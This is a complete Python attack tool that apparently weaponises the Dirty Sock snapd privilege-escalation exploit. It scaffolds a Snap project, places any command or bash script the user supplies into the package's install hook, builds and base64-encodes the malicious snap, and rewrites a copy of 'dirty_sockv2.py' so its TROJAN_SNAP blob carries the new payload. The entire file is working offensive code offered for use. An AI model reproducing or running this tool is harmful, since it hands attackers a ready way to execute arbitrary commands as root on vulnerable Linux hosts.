import os
import re
import base64
import tempfile
import argparse
import subprocess

from pathlib import Path


class SnapPayload:
    def __init__(self, name, command, file, project_path):
        self.snap = None
        self.name = name
        self.file = file
        self.payload = None
        self.command = command
        self.install_script = None
        self.project_path = Path(project_path)

    @staticmethod
    def snapcraft_exists():
        """ Determine whether snapcraft is installed or not; sanity check. """

        try:
            subprocess.run(['snapcraft', 'version'], check=True, stdout=subprocess.PIPE)
        except FileNotFoundError as e:
            print("snapcraft not installed")
            print('run: sudo apt install snapcraft -y')
            return print('then run this script again')
        except subprocess.CalledProcessError as e:
            print("snapcraft check failed, check your snapcraft install")
            return print(e)

        return True

    def initialize_project(self):
        """ Create the necessary directory structure for the malicious Snap package. """

        print(f'[+] Creating project directory structure @ {self.project_path}')

        cwd = Path.cwd()  # store original cwd
        os.chdir(self.project_path)

        try:
            subprocess.run(['snapcraft', 'init'], check=True, stdout=subprocess.PIPE)
        except subprocess.CalledProcessError as e:
            print("snapcraft init failed unexpectedly; exiting")
            print(e)
            raise SystemExit

        hookdir = self.project_path / 'snap' / 'hooks'
        hookdir.mkdir(parents=True, exist_ok=True)  # create project scaffolding

        self.install_script = hookdir / 'install'
        self.install_script.touch()  # create the file where our payload will go

        self.install_script.chmod(0o755)  # payload file must be executable

        os.chdir(str(cwd))  # return to original cwd

    def generate_hook(self):
        """ Insert the payload into PROJECTDIR/snap/hooks/install. """

        print(f'[+] Installing payload @ {self.install_script}')

        if self.command:
            self.install_script.write_text(f'#!/bin/bash\n\n{self.command}\n')
        elif self.file:
            script = Path(self.file).read_bytes()
            self.install_script.write_bytes(script)

    def update_name(self):
        """ Update Snap package name in PROJECTDIR/snap/snapcraft.yaml. """

        print(f'[+] Naming Snap: {self.name}')

        yaml = Path(self.project_path) / 'snap' / 'snapcraft.yaml'

        contents = yaml.read_text()
        contents = contents.replace('my-snap-name', self.name)

        yaml.write_text(contents)

    def build_snap(self):
        """ Build the Snap package. """

        cwd = Path.cwd()
        os.chdir(self.project_path)

        try:
            cmd = subprocess.run(['snapcraft'], check=True, stdout=subprocess.PIPE)
        except subprocess.CalledProcessError as e:
            print("Package build via snapcraft command failed unexpectedly; exiting")
            print(e)
            raise SystemExit

        # example line for regex
        # Snapped other-dirty-sockr9cwz4ri_0.1_amd64.snap
        match = re.search(r'Snapped (?P<snapname>.*?.snap$)', cmd.stdout.decode())

        if match:
            self.snap = self.project_path / match.group('snapname')
        else:
            print('Snap package name not found; exiting')
            raise SystemExit

        print(f'[+] Built Snap: {self.snap}')

        os.chdir(str(cwd))

    def encode_snap(self):
        """ Encode the resulting Snap package for use in dirty-sockv2.py """

        self.payload = base64.b64encode(self.snap.read_bytes()).decode()

    def create_modified_script(self):
        """ Modify dirty_sockv2.py to use the specified package name. """

        modified = Path('modified-dirty_sockv2.py')
        contents = Path('dirty_sockv2.py').read_text()

        contents = contents.replace('["dirty-sock"]', f'["{self.name}"]')  # replace package name

        section_start = section_end = False

        # all we're doing here is removing the hardcoded base64 blob and putting our own in
        with open(modified, 'w') as f:
            for line in contents.splitlines():
                if "For full details, read the blog linked on the github page above" in line:
                    # line before TROJAN_SNAP
                    section_start = True
                elif 'def check_args()' in line:
                    # line after TROJAN_SNAP
                    section_end = True

                if section_end:
                    # done removing old snap, enter ours
                    f.write(f"TROJAN_SNAP = '{self.payload}'\n\n{line}\n")
                    section_end = section_start = False  # both set to False so we fall through to the else clause
                elif section_start:
                    # remove old snap
                    f.write('')
                else:
                    # keep the rest as-is
                    f.write(f'{line}\n')

        print('[+] modified-dirty_sockv2.py complete!')

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-n', '--name', help='name of malicious snap package')

    cmd_or_file = parser.add_mutually_exclusive_group()
    cmd_or_file.add_argument('-c', '--command', help='the command to be run')
    cmd_or_file.add_argument('-f', '--file', help='script to be run; expects an entire bash script')

    args = parser.parse_args()

    if not SnapPayload.snapcraft_exists():
        raise SystemExit

    if not Path('dirty_sockv2.py').exists():
        print("dirty_sockv2.py not found, please place a copy in your current directory.")
        raise SystemExit

    project = tempfile.mkdtemp(prefix='other-dirty-sock')

    if not args.name:
        # generate unique project name if not provided
        # /tmp/other-dirty-sockw9g1t5p5 -> other-dirty-sockw9g1t5p5
        args.name = Path(project).stem

    payload = SnapPayload(name=args.name, command=args.command, file=args.file, project_path=project)

    payload.initialize_project()
    payload.generate_hook()
    payload.update_name()
    payload.build_snap()
    payload.encode_snap()
    payload.create_modified_script()
